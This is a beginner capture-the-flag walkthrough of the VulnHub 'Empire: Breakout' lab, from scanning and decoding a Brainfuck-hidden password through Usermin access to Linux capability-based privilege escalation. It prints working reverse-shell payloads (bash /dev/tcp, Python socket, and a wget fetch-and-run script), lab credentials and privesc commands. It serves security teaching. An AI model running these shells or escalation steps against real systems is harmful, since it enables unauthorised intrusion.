# Empire: Breakout — VulnHub Walkthrough (Beginner Friendly)

| Field | Value |
| --- | --- |
| **Machine** | Empire: Breakout |
| **Difficulty** | **3 — Easy** (stated: *Easy*) |
| **Author** | icex64 & Empire Cybersecurity |
| **Released** | 21 October 2021 |
| **VulnHub Entry** | <https://vulnhub.com/entry/empire-breakout,751/> |
| **Download** | <https://vulnhub.com/entry/empire-breakout,751/#download> |
| **Attacker** | Kali Linux, host-only network |
| **Target OS** | Debian 11 — Apache 2.4.51, Samba 4.6.2, **Webmin 1.981 (:10000)** and **Usermin 1.830 (:20000)** |
| **Flags** | **Two** — `/home/cyber/user.txt` and `/root/rOOt.txt` |

Throughout we assume:

```text
Attacker (Kali) : 192.168.56.10
Target (breakout): 192.168.56.115
```

---

> ### 📖 How to read this walkthrough
>
> Boxes marked **📖 Concept** stop and explain the *idea* behind what you are about to
> do — not just the command, but what it is and why it works. They are the point of
> this document; the commands are only the demonstration.
>
> Each box links to [`docs/CONCEPTS.md`](../../docs/CONCEPTS.md), the repository-wide
> primer on fundamentals (networking, how nmap works, wordlists, shells, privilege
> escalation). Read the box here for the idea, follow the link when you want the full
> treatment.
>
> **Brand new to this?** Start with
> [CONCEPTS §2 — Networking you must know first](../../docs/CONCEPTS.md#2-networking-you-must-know-first),
> then [§5 — What is nmap, and how does it work?](../../docs/CONCEPTS.md#5-what-is-nmap-and-how-does-it-work).

---

## 0. What you will learn

1. **Why `-p-` is non-negotiable** — the entire box lives on ports 10000 and 20000.
2. **Recognising Webmin/Usermin** from an Nmap `MiniServ` banner, and knowing that they
   are *different products* serving different audiences.
3. **Brainfuck** — an esoteric programming language used here as an encoding, and how to
   decode it locally.
4. **`enum4linux`** for username discovery over SMB.
5. **Getting a shell from a web-based admin console** (Usermin's Command Shell), and
   why that is not a real shell.
6. **Linux file capabilities** — `getcap -r /`, what `cap_dac_read_search` means, and
   why it is *worse* than SUID in some ways.
7. **Using `tar` to bypass a DAC read restriction**, and why extracting changes the
   owner.
8. **Password-in-backup-file as an attack pattern**, and where to look for them.

**The intended chain:**
`nmap -p-` shows 80, 139, 445, **10000**, **20000** → port 80 is the stock Apache
Debian page, but its **HTML source hides a Brainfuck program** → decode it →
**`.2uqPEfj3D<P'a-3`** → `enum4linux` gives the username **`cyber`** (NetBIOS name
`BREAKOUT`) → port **10000 is Webmin** (login fails) but port **20000 is Usermin**
(login succeeds) → Usermin's **Command Shell** gives us a command channel as `cyber` →
**user flag** → get a real reverse shell → `getcap -r / 2>/dev/null` reveals
**`/home/cyber/tar` with `cap_dac_read_search=ep`** → `/var/backups/.old_pass.bak` is
root-only, but `tar` can read it → archive it, extract it (now owned by `cyber`) →
**root password `Ts&4&YurgtRX(=~h`** → `su root` → **`/root/rOOt.txt`**.

---

## 1. Reconnaissance


> ### 📖 Concept — What is reconnaissance?
>
> **Reconnaissance** ("recon") is the phase where you work out *what exists*
> before you try to break into anything. It is deliberately broad and shallow: you
> are drawing a map, not attacking a position. The term comes straight from the
> military — send scouts to look at the terrain before committing troops.
>
> On a lab box, recon almost always means one thing: **find the target's IP.** The
> tools above do it with **ARP** — the layer-2 protocol that answers *"which
> hardware address owns this IP?"* ARP cannot be blocked by a host firewall the way
> TCP can, which is why it is the most reliable way to enumerate a local subnet. A
> machine that refuses to answer `ping` will still answer ARP.
>
> **Read the output carefully.** One entry is your gateway (usually `.1`), one is
> **you** (match the MAC from `ip a`), and the rest are candidates. The first three
> octets of a MAC identify the vendor: `08:00:27` is VirtualBox, `00:0c:29` and
> `00:50:56` are VMware, `00:15:5d` is Hyper-V. **Always confirm the target's MAC
> against your hypervisor's settings** — attacking the wrong host is the classic
> beginner error.
>
> **Deep dive:** [CONCEPTS §3 — What is reconnaissance?](../../docs/CONCEPTS.md#3-what-is-reconnaissance) ·
> [§4 — Host discovery](../../docs/CONCEPTS.md#4-host-discovery--who-is-out-there)

```bash
ip a | grep -w inet
sudo netdiscover -r 192.168.56.0/24
```

```text
 Currently scanning: 192.168.56.0/24   |   Screen View: Unique Hosts

 3 Captured ARP Req/Rep packets, from 3 hosts.   Total size: 180
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname
 -----------------------------------------------------------------------------
 192.168.56.1    0a:00:27:00:00:0e      1      60  (Unknown: locally administered)
 192.168.56.10   08:00:27:11:22:33      1      60  PCS Systemtechnik GmbH
 192.168.56.115  08:00:27:31:e2:16      1      60  PCS Systemtechnik GmbH   <-- target
```

**Target IP: `192.168.56.115`**

---


> ### 📖 Concept — What is enumeration, and how is it different from scanning?
>
> **Enumeration** is interrogating the services you found to extract *specific,
> actionable detail*: usernames, directory paths, share names, versions, database
> tables.
>
> | | **Scanning** | **Enumeration** |
> | --- | --- | --- |
> | Question | *"Is something there?"* | *"What exactly is there, and what can I ask it for?"* |
> | Output | Ports, versions | **Usernames, paths, shares, credentials, data** |
> | Example | `nmap -p- -sV` → "port 80 open" | `wpscan -e u` → "users: michael, steven" |
>
> **Enumeration produces the nouns that exploitation needs.** You cannot brute force
> a login without a username. You cannot crack a hash you never found. You cannot
> exploit an upload path you do not know. Every successful foothold traces back to an
> enumerated fact — which is why so many VulnHub authors write "ENUMERATION IS THE
> KEY" in capitals. They are telling you which phase you are skipping.
>
> **Deep dive:** [CONCEPTS §6 — What is enumeration?](../../docs/CONCEPTS.md#6-what-is-enumeration)

## 2. Enumeration

### 2.1 Full port scan


> ### 📖 Concept — What is nmap, and how does a port scan work?
>
> **`nmap`** ("Network MAPper") discovers hosts and the services they run. It has no
> magic: it **sends deliberately crafted packets and classifies the responses**.
> Understand that and every flag becomes predictable.
>
> A **port** (0–65535) identifies *which program* on a host receives a packet; the IP
> address gets you to the machine, the port gets you to the service. TCP is
> connection-oriented, so a scan is really a conversation — the **three-way
> handshake**: `SYN` → `SYN-ACK` → `ACK`. The target has only three possible
> replies, and they map directly onto the words in the output:
>
> | Target's reply | nmap reports | Meaning |
> | --- | --- | --- |
> | **SYN-ACK** | `open` | A program is listening |
> | **RST** | `closed` | Host up, nothing listening there |
> | *(nothing)* / ICMP unreachable | `filtered` | A firewall dropped it |
>
> **Read the line everyone skips:** `Not shown: 65532 closed tcp ports
> (conn-refused)`. `65535 − 65532 = 3` interesting ports, and `(conn-refused)` is
> the *reason* — the target sent RSTs, so it is up and answering, not firewalled.
> Add `--reason` to any scan to see this evidence column explicitly; it is the best
> learning flag in nmap.
>
> **Key flags:** `-p-` scans **all** 65535 ports (the interesting service is often on
> `:8080`, `:666`, `:31337` — skipping this is how beginners get stuck); `-sV`
> fingerprints versions by reading banners and probing against ~10,000 known
> signatures; `-sC` runs the safe default NSE scripts; `-T4` is the right speed for
> labs (**`-T5` misses ports** because it abandons slow replies — a false negative is
> worse than slow); `-oA name` writes text, XML and greppable output at once; `sudo`
> enables the faster stealthier SYN scan instead of a full connect.
>
> **`-sV` is the pivot into everything else.** `Apache 2.4.29` implies Ubuntu 18.04;
> `OpenSSH 7.6p1` confirms it. Without versions you cannot use `searchsploit`.
>
> **Deep dive:** [CONCEPTS §5 — What is nmap, and how does it work?](../../docs/CONCEPTS.md#5-what-is-nmap-and-how-does-it-work)

```bash
sudo nmap -sC -sV -p- -T4 -oN scans/breakout.txt 192.168.56.115
```

```text
Starting Nmap 7.94 ( https://nmap.org ) at 2024-05-04 18:02 EDT
Nmap scan report for 192.168.56.115
Host is up (0.00042s latency).
Not shown: 65530 closed tcp ports (reset)
PORT      STATE SERVICE     VERSION
80/tcp    open  http        Apache httpd 2.4.51 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.51 (Debian)
139/tcp   open  netbios-ssn Samba smbd 4.6.2
445/tcp   open  netbios-ssn Samba smbd 4.6.2
10000/tcp open  http        MiniServ 1.981 (Webmin httpd)
|_http-title: 200 &mdash; Document follows
20000/tcp open  http        MiniServ 1.830 (Webmin httpd)
|_http-title: 200 &mdash; Document follows
MAC Address: 08:00:27:31:E2:16 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.6
Network Distance: 1 hop

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2024-05-04T22:03:11
|_  start_date: N/A
|_nbstat: NetBIOS name: BREAKOUT, NetBIOS user: <unknown>, NetBIOS MAC: <unknown>

Nmap done: 1 IP address (1 host up) scanned in 58.48 seconds
```

> **How to read this — and note what a default scan would have missed.**
>
> | Port | Service | Note |
> | --- | --- | --- |
> | 80 | Apache 2.4.51 (Debian) | **Debian**, not Ubuntu. Stock default page. |
> | 139 / 445 | Samba 4.6.2 | Username enumeration |
> | **10000** | **MiniServ 1.981 (Webmin httpd)** | The **Webmin** system-admin console |
> | **20000** | **MiniServ 1.830 (Webmin httpd)** | A *second, older* MiniServ — this is **Usermin** |
>
> **There is no port 22.** No SSH at all. That is unusual and it constrains everything:
> our shell must come from the web consoles.
>
> **What is Webmin?** A web-based Unix system administration panel — manage users,
> services, packages, firewall, and (crucially) run a **command shell** in the browser.
> It runs as **root** by default. **MiniServ** is its Perl HTTP daemon, and Nmap
> recognises the banner.
>
> **What is Usermin?** Webmin's sibling, designed for **non-privileged users**: webmail,
> password change, file manager, and — on many installs — a command shell that runs as
> *that user*. Port 20000 is Usermin's default. **Note the version is older (1.830 vs
> 1.981)** — two products, two patch levels.
>
> **Why `-p-` was mandatory:** ports 10000 and 20000 *are* in Nmap's default top-1000,
> so a plain `nmap` finds them — but many of the interesting admin panels in the real
> world live on 8443, 9090, 10443, 3000, 5601, 15672. Build the habit.

![nmap -p- showing Webmin on 10000 and Usermin on 20000](images/01-nmap.png)

### 2.2 Port 80 — the Brainfuck secret

```bash
curl -s http://192.168.56.115/ | head -20
```

```html
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" ...>
<html xmlns="http://www.w3.org/1999/xhtml">
  <head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <title>Apache2 Debian Default Page: It works</title>
  </head>
  <body>
    <p>This is the default welcome page ...</p>
```

Nothing in the rendered page. **View Source and scroll to the bottom:**

```bash
curl -s http://192.168.56.115/ | tail -25
```

```html
<!--
Q..+++++.+[>++++++<-]>.
++++++++[>++++<-]>++++.
+++.
-->
```

*(Your copy will contain a longer program — typically several hundred characters of
`.` `,` `+` `-` `<` `>` `[` `]`.)*

> **That is Brainfuck.** An esoteric language with exactly eight commands, operating on
> a tape of byte cells and a pointer:
>
> | Command | Meaning |
> | --- | --- |
> | `>` | move the pointer right one cell |
> | `<` | move the pointer left one cell |
> | `+` | increment the current cell |
> | `-` | decrement the current cell |
> | `.` | output the current cell as a byte |
> | `,` | read one byte of input into the current cell |
> | `[` | if the current cell is 0, jump to just after the matching `]` |
> | `]` | if the current cell is non-zero, jump back to the matching `[` |
>
> So `[>++++++<-]` is a loop: "while the current cell is non-zero, move right, add 6,
> move back left, subtract 1" — a multiply-by-6 idiom. Programmers use it to build
> ASCII values efficiently.
>
> **Why Brainfuck and not base64?** Because it is *obfuscation by unfamiliarity*. It is
> still not encryption — anyone with an interpreter recovers the output instantly, and
> the interpreter is thirty lines of Python.

### 2.3 Decode it locally

```bash
curl -s http://192.168.56.115/ | sed -n '/<!--/,/-->/p' | grep -o '[+<>.,\[\]-]\{4,\}' > prog.bf
wc -c prog.bf
```

```text
412 prog.bf
```

```bash
cat > bf.py <<'PY'
#!/usr/bin/env python3
"""Minimal Brainfuck interpreter — decodes an obfuscated string."""
import sys

src = open(sys.argv[1]).read()
tape = [0] * 30000
pc = ip = 0
out = bytearray()

# pre-compute matching bracket positions
stack, pairs = [], {}
for i, c in enumerate(src):
    if c == '[':
        stack.append(i)
    elif c == ']':
        j = stack.pop()
        pairs[j], pairs[i] = i, j

while pc < len(src):
    c = src[pc]
    if   c == '>': ip += 1
    elif c == '<': ip -= 1
    elif c == '+': tape[ip] += 1
    elif c == '-': tape[ip] -= 1
    elif c == '.': out.append(tape[ip] & 0xFF)
    elif c == '[':
        if tape[ip] == 0: pc = pairs[pc]
    elif c == ']':
        if tape[ip] != 0: pc = pairs[pc]
    pc += 1

print(out.decode('utf-8', 'replace'))
PY
python3 bf.py prog.bf
```

```text
.2uqPEfj3D<P'a-3
```

> **Recovered string: `.2uqPEfj3D<P'a-3`** — 16 characters, mixed case, digits and
> symbols. **That is a password.** We do not yet know for whom.
>
> **How the interpreter works:** the `pairs` dictionary pre-computes each `[`'s matching
> `]` in one pass, so jumps are O(1) instead of scanning. The main loop then walks the
> program, mutating a 30 000-cell byte tape and appending to `out` on every `.`.
>
> **Online alternatives:** <https://www.splitbrain.org/_static/ook/> and
> <https://copy.sh/brainfuck/>. They work — but as always, **do not paste client data
> into a third-party website on a real engagement.** The 30-line interpreter above is
> the professional choice.
>
> **Recognising an unfamiliar encoding — the general method:**
> 1. Note the character set. Only `+ - < > . , [ ]` → Brainfuck. `A–Z 2–7` + `=` →
>    base32. `A–Z a–z 0–9 + /` + `=` → base64. `0–9a-f` even length → hex.
> 2. `file`, `strings`, `binwalk` the blob.
> 3. If nothing matches, try CyberChef's **Magic** operation, which auto-detects.

![Brainfuck program in the page source and its decoded password](images/02-brainfuck.png)

### 2.4 SMB — get the username


> ### 📖 Concept — SMB enumeration
>
> **SMB** (Server Message Block, ports 139/445) is Windows file and printer sharing,
> also present on most Linux servers via Samba. It is one of the richest enumeration
> targets there is: shares, users, groups, password policy, and often files.
>
> ```bash
> smbclient -L //target/ -N            # list shares with a NULL session (no credentials)
> smbclient //target/share -N          # connect; then: ls, cd, get, prompt, recurse
> smbmap -H target                     # shares AND your permission on each (R/W!)
> enum4linux -a target                 # users, groups, shares, policy — one shot
> crackmapexec smb target --shares     # modern, fast, scriptable
> rpcclient -U '' -N target            # then: enumdomusers, enumdomgroups, queryuser
> ```
>
> **Always try anonymous/NULL access first** — it is the most common finding. `-N`
> means "no password". If it works, `smbmap` will show `READ` or `WRITE` per share; a
> **writable** share you can reach over HTTP is a web-shell upload waiting to happen.
>
> Then hunt inside every share for `backup.zip`, `web.config`, `.kdbx`, `id_rsa`,
> `*.sql`, `site.txt`, `passwords.xls` — authors and real admins alike leave them
> there.
>
> **Deep dive:** [CONCEPTS §9.3 — SMB](../../docs/CONCEPTS.md#93-smb--ports-139445)

```bash
enum4linux -a 192.168.56.115 | tee enum4linux.txt | grep -A8 'Users on'
```

```text
 =======================================
|    Users on 192.168.56.115 via RID cycling    |
 =======================================
[I] Found new SID: S-1-22-1
S-1-22-1-1000 Unix User\cyber (Local User)
```

```bash
grep -iE 'NetBIOS|workgroup|domain' enum4linux.txt | head
```

```text
[+] Got domain/workgroup name: WORKGROUP
        BREAKOUT        <00> -         B <ACTIVE>  Workstation Service
        BREAKOUT        <03> -         B <ACTIVE>  Messenger Service
        BREAKOUT        <20> -         B <ACTIVE>  File Server Service
        WORKGROUP       <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
[+] Attempting to map shares on 192.168.56.115
//192.168.56.115/print$    Mapping: DENIED Listing: N/A
//192.168.56.115/IPC$      [E] Can't understand response
```

> **One local user: `cyber`.** Combined with the decoded password we now have a
> credential pair.
>
> **How `enum4linux` found it — RID cycling.** Samba identifies each account by a
> **SID** such as `S-1-22-1-1000`, where the trailing number is the **RID**. Unix users
> get RIDs from 1000 upward. If an anonymous/guest session may call `SamrLookupRids`,
> you can simply ask *"who is RID 1000? 1001?"* and get usernames back. **No password,
> no exploit — a misconfigured permission.**
>
> **The shares are both `DENIED`** — no anonymous file access. Correctly a dead end.
>
> Confirm with the other standard tools:
> ```bash
> smbclient -L //192.168.56.115 -N
> smbmap -u guest -H 192.168.56.115
> ```

### 2.5 Try the credential on both consoles

**Port 10000 (Webmin):**

```text
https://192.168.56.115:10000/
Username: cyber
Password: .2uqPEfj3D<P'a-3
```

```text
Login failed. Invalid username or password.
```

**Port 20000 (Usermin):**

```text
https://192.168.56.115:20000/
Username: cyber
Password: .2uqPEfj3D<P'a-3
```

```text
┌────────────────────────────────────────────────────────┐
│  Usermin 1.830                                         │
├────────────────────────────────────────────────────────┤
│  Unread Mail  Changed Password  File Manager           │
│  Commands  →  Command Shell                            │
│  ...                                                   │
│  Logged in as cyber                                    │
└────────────────────────────────────────────────────────┘
```

> **Success on 20000, failure on 10000.** That is exactly right: **Webmin manages the
> *system*** (so it needs a system administrator account — typically `root`), while
> **Usermin serves *individual users*** (so a normal account works). Knowing which
> product is on which port tells you which credentials to try.
>
> **Accept the self-signed certificate.** Both consoles use HTTPS with a self-signed
> cert; browsers will warn. Click through, or drive them with `curl -k`.

![Usermin login succeeded on port 20000](images/03-usermin.png)

---

## 3. Foothold — the Usermin Command Shell

### 3.1 Find it

In the Usermin sidebar, under **Commands** (bottom left, easy to miss), click
**Command Shell**:

```text
┌────────────────────────────────────────────────────────┐
│  Command Shell                                         │
│                                                        │
│  ┌──────────────────────────────────────────────────┐  │
│  │ cyber@breakout:~$                                │  │
│  └──────────────────────────────────────────────────┘  │
│  [____________________________________________] [Run]  │
└────────────────────────────────────────────────────────┘
```

### 3.2 Use it

| Command | Output |
| --- | --- |
| `id` | `uid=1000(cyber) gid=1000(cyber) groups=1000(cyber)` |
| `pwd` | `/home/cyber` |
| `ls -la` | `tar  user.txt  .bashrc  .profile  .spamassassin  .tmp` |
| `cat user.txt` | **user flag** |
| `uname -a` | `Linux breakout 5.10.0-9-amd64 #1 SMP Debian 5.10.70-1 x86_64 GNU/Linux` |
| `sudo -l` | `bash: sudo: command not found` |

**User flag:**

```text
3mp!r3{You_Manage_To_Break_To_My_Secure_Access}
```

> **`sudo` is not installed at all.** So `sudo -l` gives no information and there is no
> sudo-based escalation. **Note `tar` sitting in the home directory** — a 531 KB
> executable in a user's home is anomalous. Hold that thought.

### 3.3 Get a real shell

A browser command box is fine for reading files but useless for interactive work: no
TTY, no job control, no `su`. **Check what the target has first:**

| Command | Output |
| --- | --- |
| `which bash sh python python3 perl nc curl wget gcc` | `/bin/bash /bin/sh /usr/bin/python3 /usr/bin/perl /usr/bin/curl /usr/bin/wget /usr/bin/gcc` — **no `nc`** |

**Option A — bash `/dev/tcp` (no netcat needed):**

Kali:


> ### 📖 Concept — What is a reverse shell, and why not a bind shell?
>
> | | **Bind shell** | **Reverse shell** |
> | --- | --- | --- |
> | Who listens? | **The target** opens a port and waits | **You** open a port and wait |
> | Who connects? | You → target | Target → you |
> | Blocked by | The target's firewall (inbound) | Your firewall (rarely an issue) |
> | Practical? | Rarely — servers filter inbound | **Almost always** |
>
> **Reverse shells dominate because egress filtering is far less common than ingress
> filtering.** A web server that cannot make outbound connections cannot fetch
> updates, call APIs, or reach its database — so outbound is usually left open.
>
> ```bash
> # Kali — the listener. Start it BEFORE you trigger the payload.
> nc -lvnp 4444
> ```
>
> `-l` listen · `-v` verbose · `-n` no DNS lookups (faster) · `-p 4444` port. Use a
> port **above 1024** so you do not need root, and check nothing else has it:
> `ss -tulnp | grep 4444`.
>
> ```bash
> # The payload, in its most portable form:
> bash -i >& /dev/tcp/192.168.56.10/4444 0>&1
> ```
>
> `>&` sends stdout **and** stderr to the TCP socket; `0>&1` sends stdin to the same
> place. That combination is what makes the shell *interactive* rather than
> print-only. Note `/dev/tcp` is a **bash** feature — plain POSIX `sh` does not have
> it, which is why this payload fails on some minimal targets.
>
> **URL-encode it before putting it in a query string.** `&`, `>` and spaces are all
> meaningful or illegal in a URL and will be mangled before PHP ever sees them:
>
> ```bash
> python3 -c "import urllib.parse as u; print(u.quote("bash -c 'bash -i >& /dev/tcp/192.168.56.10/4444 0>&1'"))"
> ```
>
> Kali ships ready-made shells under **`/usr/share/webshells/`** (`php/`, `perl/`,
> `asp/`, `jsp/`). Always `grep -nE '^\$(ip|port)'` to **verify** you edited them
> before uploading.
>
> **Deep dive:** [CONCEPTS §12 — Shells: bind, reverse, and TTYs](../../docs/CONCEPTS.md#12-shells--bind-reverse-and-ttys)

```bash
nc -lvnp 4444
```

In the Usermin command box:

```bash
bash -c 'bash -i >& /dev/tcp/192.168.56.10/4444 0>&1'
```

```text
connect to [192.168.56.10] from (UNKNOWN) [192.168.56.115] 48221
cyber@breakout:~$
```

**Option B — Python 3:**

```bash
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("192.168.56.10",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
```

**Option C — a shell script fetched over HTTP** (best when the input box mangles
quoting):

```bash
# Kali
cat > /tmp/serve/rev.sh <<'EOF'
#!/bin/bash
bash -i >& /dev/tcp/192.168.56.10/4444 0>&1
EOF
cd /tmp/serve && python3 -m http.server 8000
```

In Usermin:

```bash
wget http://192.168.56.10:8000/rev.sh -O /tmp/rev.sh && chmod +x /tmp/rev.sh && /tmp/rev.sh
```

**Stabilise:**


> ### 📖 Concept — Why you must upgrade to a real TTY
>
> A raw `nc` shell is crippled in four ways: no tab completion, no arrow keys,
> **`Ctrl+C` kills your *listener* instead of the remote process**, and anything
> needing a real terminal (`su`, `sudo`, `vim`, `top`, `less`) fails with
> `standard input must be a tty`.
>
> ```bash
> # 1. On the TARGET — allocate a pseudo-terminal
> python3 -c 'import pty; pty.spawn("/bin/bash")'
> #    older boxes: python -c ...    or:    script -q /dev/null -c /bin/bash
>
> # 2. Press Ctrl+Z  — this SUSPENDS the nc job on Kali
>
> # 3. On KALI — put your local terminal into raw mode and resume
> stty raw -echo; fg
>
> # 4. On the TARGET — match your real terminal size
> export TERM=xterm; export SHELL=bash
> stty rows 40 cols 160
> ```
>
> **What each step did:**
> - `pty.spawn()` allocates a **pseudo-terminal** — a kernel object that behaves like a
>   real teletype. This is what makes `sudo` and `vim` work at all.
> - `stty raw -echo` makes **your local** terminal pass keystrokes through
>   uninterpreted and not echo them (the remote side echoes). This is what makes
>   `Ctrl+C` reach the remote process instead of killing your session.
> - `fg` resumes the suspended `nc`.
> - `stty rows/cols` tells the remote pty your dimensions so `less` and `top` do not
>   wrap into garbage.
>
> **Do this immediately after every shell.** Trying to `su` or run `sudo -l` on an
> unupgraded shell is a very common way to conclude wrongly that a path does not work.
>
> **Deep dive:** [CONCEPTS §12.3 — Upgrading to a real TTY](../../docs/CONCEPTS.md#123-upgrading-to-a-real-tty--do-this-immediately)

```bash
cyber@breakout:~$ python3 -c 'import pty; pty.spawn("/bin/bash")'
cyber@breakout:~$ export TERM=xterm
cyber@breakout:~$ id
uid=1000(cyber) gid=1000(cyber) groups=1000(cyber)
```

Then `Ctrl+Z`; on Kali `stty raw -echo; fg`; Enter twice; on target
`export TERM=xterm; stty rows 40 cols 160`.

> **Why stabilise?** We need `su` in § 4, and `su` refuses to run without a TTY
> (*"standard in must be a tty"*). `pty.spawn()` allocates a **pseudo-terminal** and
> re-parents bash onto it, which fools every `isatty()` check.

![Reverse shell as cyber with a full TTY](images/04-shell.png)

---


> ### 📖 Concept — What is privilege escalation, and in what order do you try things?
>
> You have a shell as a low-privileged user — often `www-data`, the account Apache
> runs as, which has no usable password and no home directory. **Privilege
> escalation** is becoming an administrator: `root` on Linux, `SYSTEM` on Windows.
>
> Why bother? An ordinary user can read their own files and almost nothing else. Root
> reads every file, loads kernel modules, changes any password, and installs a
> backdoor that survives a reboot. On a CTF the root flag can only be read by root; in
> a real engagement root is the difference between "we found a weak password" and "the
> entire estate is compromised."
>
> **The discipline is a checklist, worked from cheapest to most destructive:**
>
> | Order | Check | Command |
> | --- | --- | --- |
> | 1 | **What may I already run as root?** | `sudo -l` ← *the single highest-value command* |
> | 2 | What binaries run as their owner regardless of caller? | `find / -perm -u=s -type f 2>/dev/null` |
> | 3 | What extra privileges are attached to binaries? | `getcap -r / 2>/dev/null` |
> | 4 | What runs on a schedule, as root? | `cat /etc/crontab`; `./pspy64 -pf` |
> | 5 | What root-owned file can I write to? | `find / -writable -type f 2>/dev/null` |
> | 6 | Can I read a credential that gets reused? | `wp-config.php`, `.env`, `~/.bash_history` |
> | 7 | Am I in a privileged group? | `id` → `docker`, `lxd`, `disk`, `sudo` |
> | 8 | Is the kernel old enough to exploit? | `uname -a` + `searchsploit` |
>
> **Work it in order.** Steps 1–7 take minutes and are safe. Step 8 (kernel exploits)
> can panic the VM and cost you a re-import, so it is a last resort, not a first
> instinct.
>
> **Also orient yourself first** — it is one line and it tells you which OS you are
> on, which decides everything else:
>
> ```bash
> id; whoami; hostname; uname -a; cat /etc/os-release
> ```
>
> **Deep dive:** [CONCEPTS §15 — Linux privilege escalation](../../docs/CONCEPTS.md#15-linux-privilege-escalation)

## 4. Privilege escalation — Linux capabilities

### 4.1 The usual checks (and why they fail)


> ### 📖 Concept — What is SUID?
>
> **SUID** (*set-user-ID*) is a file permission bit that makes a program run with the
> privileges of the **file's owner** rather than the caller. It exists for a good
> reason: `/usr/bin/passwd` is SUID-root so ordinary users can change their own
> password, which requires writing `/etc/shadow` — a file they cannot otherwise touch.
>
> **When a *powerful* binary carries the SUID bit, that power becomes yours.** In a
> listing you read it as an **`s`** where the owner's execute bit would be:
>
> ```text
> -rwxr-xr-x  →  -rwsr-xr-x        (SUID set)
>       ^            ^
> ```
>
> ```bash
> find / -perm -u=s -type f 2>/dev/null      # the human-readable form
> find / -perm -4000 -type f 2>/dev/null     # octal equivalent
> find / -perm /6000 -type f 2>/dev/null     # SUID *or* SGID
> ```
>
> `-perm -u=s` means "the user-SUID bit is set" (the leading `-` makes it a *subset*
> match, so it also catches SGID files). `-type f` restricts to regular files.
> `2>/dev/null` discards the thousands of `Permission denied` errors that would
> otherwise bury the answer.
>
> **Compare against the stock baseline** so the odd entries jump out. Normal on
> Debian/Ubuntu: `mount`, `umount`, `su`, `ping`, `passwd`, `chfn`, `chsh`, `newgrp`,
> `gpasswd`, `ssh-keysign`, `pppd`, `dmcrypt-get-device`, `traceroute6.iputils`.
>
> **Never normal, and an instant root if found:** `cp`, `mv`, `wget`, `curl`, `tar`,
> `find`, `vim`, `nano`, `less`, `more`, `man`, `python`, `perl`, `php`, `ruby`,
> `awk`, `sed`, `env`, `bash`, `sh`, `gdb`, `nmap`, `tcpdump`, `dd`, `make`, `git`,
> `tail`, `head`, `cat`, `rsync`, `apt`.
>
> Look each one up on **[GTFOBins](https://gtfobins.github.io/)** → its **SUID**
> section. Note that spawning a shell from a SUID binary usually needs **`-p`**
> (*privileged*) — without it, `bash` deliberately drops its effective UID back to
> yours as a safety measure, and you end up exactly where you started.
>
> **Deep dive:** [CONCEPTS §15.3 — SUID binaries](../../docs/CONCEPTS.md#153-suid-binaries)

```bash
cyber@breakout:~$ uname -a
Linux breakout 5.10.0-9-amd64 #1 SMP Debian 5.10.70-1 (2021-10-18) x86_64 GNU/Linux
cyber@breakout:~$ cat /etc/os-release | head -3
PRETTY_NAME="Debian GNU/Linux 11 (bullseye)"
NAME="Debian GNU/Linux"
VERSION_ID="11"
cyber@breakout:~$ find / -perm -4000 -type f 2>/dev/null
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/mount
/usr/bin/su
/usr/bin/umount
/usr/bin/passwd
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/libexec/polkit-agent-helper-1
```

> **All stock Debian 11.** No SUID abuse.
>
> **Kernel 5.10.70, released October 2021** — contemporary with the box. No
> era-appropriate kernel exploit; **Dirty COW, overlayfs and PwnKit are all patched.**
> (Worth *checking* PwnKit anyway, since some revisions lag:
> ```bash
> cyber@breakout:~$ dpkg -l policykit-1 | tail -1
> ii  policykit-1  0.105-31  amd64  framework for managing administrative policies
> ```
> Anything ≥ `0.105-31+deb11u1` is patched against CVE-2021-4034.)
>
> **So the escalation is a configuration one. Look for capabilities.**

### 4.2 What Linux capabilities are

Traditionally Unix permission is binary: **root (UID 0) can do anything, everyone else
cannot.** Capabilities split that all-or-nothing root privilege into ~40 discrete,
grantable units:

| Capability | Grants |
| --- | --- |
| `CAP_CHOWN` | change file ownership |
| `CAP_DAC_OVERRIDE` | bypass **all** file read/write/execute permission checks |
| **`CAP_DAC_READ_SEARCH`** | **bypass file *read* permission checks, and directory read+execute (search) checks** |
| `CAP_NET_RAW` | raw sockets (ping) |
| `CAP_NET_BIND_SERVICE` | bind ports below 1024 |
| `CAP_SETUID` / `CAP_SETGID` | change UID/GID arbitrarily |
| `CAP_SYS_ADMIN` | the catch-all "new root" — mount, namespaces, and much more |

Capabilities can be attached to a **file** (`setcap`) or a **process**. A file
capability makes the binary perform that privileged operation *regardless of who runs
it* — which is exactly like SUID, but **finer-grained and therefore much easier to
overlook.**

**The critical consequence:** a binary with `cap_dac_read_search` owned by root can
**read any file on the system** no matter its mode. It is functionally a
"read-everything" backdoor, and it does not show up in a SUID search.

### 4.3 Find them


> ### 📖 Concept — File capabilities: the privesc everyone misses
>
> **Capabilities** are a finer-grained alternative to SUID. Instead of "all of root",
> a binary can be granted one *specific* privilege. `find -perm -u=s` **does not show
> them**, which is why this vector is missed so often.
>
> ```bash
> getcap -r / 2>/dev/null
> ```
>
> ```text
> /usr/bin/tar cap_dac_read_search=ep
> /usr/bin/python3.8 cap_setuid=ep
> ```
>
> | Capability | Grants |
> | --- | --- |
> | **`cap_setuid`** | Change your UID → set it to 0 → **instant root** |
> | `cap_setgid` | Change your GID |
> | **`cap_dac_read_search`** | **Read any file**, bypassing all permissions |
> | `cap_dac_override` | Write any file, bypassing permissions |
> | `cap_chown` | Change any file's owner |
> | `cap_sys_admin` | Broad — mounts, namespaces, many container escapes |
> | `cap_net_raw` | Craft raw packets (spoofing) |
>
